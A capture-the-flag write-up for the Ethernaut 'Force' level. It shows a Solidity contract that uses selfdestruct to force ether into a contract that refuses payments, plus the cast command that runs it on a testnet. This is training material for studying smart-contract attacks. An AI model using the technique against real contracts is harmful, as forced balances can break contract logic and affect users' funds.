---
title: "Force"
tags: ["selfdestruct"]
reference: https://ethernaut.openzeppelin.com/level/7
---

# Description

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the "?" page above, section "Beyond the console"

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

# Solution

1. deploy `ForceSendETH` contract

This function will recieve ether from msg.sender and them self destory itself and send all its ether balance to our victim address.

```
contract ForceSendETH {
    function pwn(address victim) external payable {
        selfdestruct(payable(victim));
    }
}
```

2. call `pwn()`

```
cast send 0x3563481bAaFF769260aD2df7195B46F1c450d694 "pwn(address)" 0xbE7B8679255c0531c346fcEa6EEF6C4a2222D8a1 --value 0.00000001ether --rpc-url $BASE_SEPOLIA_RPC --private-key
```
